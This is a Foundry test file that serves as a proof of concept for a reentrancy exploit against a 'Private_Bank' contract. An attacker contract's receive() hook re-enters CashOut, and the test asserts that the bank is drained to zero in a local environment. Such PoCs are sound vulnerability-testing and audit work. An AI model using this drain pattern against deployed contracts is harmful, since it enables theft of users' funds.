// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol";

contract ReentrantAttacker {
    Private_Bank public bank;
    uint public reentrancyCount;
    uint public amount;
    uint public depositAmount;

    constructor(Private_Bank _bank, uint _depositAmount, uint _attackAmount) {
        bank = _bank;
        depositAmount = _depositAmount;
        amount = _attackAmount;
    }

    function fund() public {
        bank.Deposit{value: depositAmount}();
    }

    function attack() external payable {
        bank.CashOut(amount);
    }

    receive() external payable {
        if (reentrancyCount < 1) {
            reentrancyCount++;
            bank.CashOut(amount);
        }
    }
}

contract PrivateBankTest is Test {
    Log public logContract;
    Private_Bank public bank;
    ReentrantAttacker public attacker;

    uint public depositAmount = 10 ether;
    uint public attackAmount = 5 ether;

    function setUp() public {
        logContract = new Log();
        bank = new Private_Bank(address(logContract));
        attacker = new ReentrantAttacker(bank, depositAmount, attackAmount);
        
        vm.deal(address(attacker), 11 ether);
        attacker.fund();
    }

    function testReentrancy() public {
        // Record state before attack
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerBankBalanceBefore = bank.balances(address(attacker));

        console.log("--- BEFORE-Trigger ---");
        console.log("Bank balance: ", bankBalanceBefore);
        console.log("Attacker balance: ", attackerBalanceBefore);
        console.log("Attacker's internal bank balance: ", attackerBankBalanceBefore);

        console.log("--- Trigger: Reentrant Attack ---");
        attacker.attack();

        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerBankBalanceAfter = bank.balances(address(attacker));

        console.log("--- AFTER-Trigger ---");
        console.log("Bank balance: ", bankBalanceAfter);
        console.log("Attacker balance: ", attackerBalanceAfter);
        console.log("Attacker's internal bank balance: ", attackerBankBalanceAfter);

        // Check conditions for successful exploitation
        bool drained = (bankBalanceAfter == 0);
        bool internalBalanceCleared = (attackerBankBalanceAfter == 0);
        bool attackerReceivedFullAmount = (attackerBalanceAfter == 11 ether);
        
        if (drained && internalBalanceCleared && attackerReceivedFullAmount) {
            console.log("Vulnerability Exists: Reentrant attack drained bank, cleared internal balance, and transferred full funds");
        } else {
            console.log("Vulnerability not Exist: Expected state changes were not observed");
        }

        // Original PoC assertion
        assertEq(address(bank).balance, 0, "Bank drained through reentrancy");
    }
}